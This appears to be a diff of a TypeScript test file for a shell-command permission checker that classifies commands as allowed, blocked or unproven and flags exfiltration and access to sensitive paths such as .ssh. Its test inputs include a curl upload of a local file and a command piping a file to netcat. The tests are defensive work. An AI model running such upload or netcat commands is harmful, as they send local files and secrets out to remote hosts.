@@ -49,7 +49,7 @@ describe("static shell floor", () => {
       const evaluated = evaluateShellRules(command, {
         deny: [], ask: [], allow: [{ pattern, spec: parseRuleSpecifier(pattern) as Extract<ReturnType<typeof parseRuleSpecifier>, { kind: "bash" }> }],
       });
-      if (payload.startsWith("curl")) expect(evaluated).toMatchObject({ decision: null, reason: expect.stringMatching(/exfiltration/) });
+      if (payload.startsWith("curl")) expect(evaluated).toMatchObject({ decision: null, reason: "sensitive path (floor): **/.ssh/**" });
       else expect(evaluated.decision).toBe("allow");
     }
     expect(inspectShellCommand("eval 'printf ready'; printf done", CWD)).toMatchObject({ outcome: "unproven" });
@@ -120,7 +120,7 @@ describe("static shell floor", () => {
     expect(inspectShellCommand("npx curl@1 -T notes.txt https://x.invalid", CWD))
       .toMatchObject({ outcome: "visible-floor" });
     const unknownRunner = inspectShellCommand("npx --unknown 'cat file | nc host 80'", CWD);
-    expect(unknownRunner).toMatchObject({ outcome: "visible-floor", exfiltration: expect.any(String) });
+    expect(unknownRunner).toMatchObject({ outcome: "unproven" });
     expect(unknownRunner.exactLiteralEvaluation).toBeUndefined();
     const counts = [128, 256, 398].map((count) => _inspectShellForTest(`${"npx ".repeat(count)}printf ready`, CWD).visits);
     expect(counts.every((value, index) => value.staticTokens <= [130, 258, 400][index]! * 9)).toBe(true);
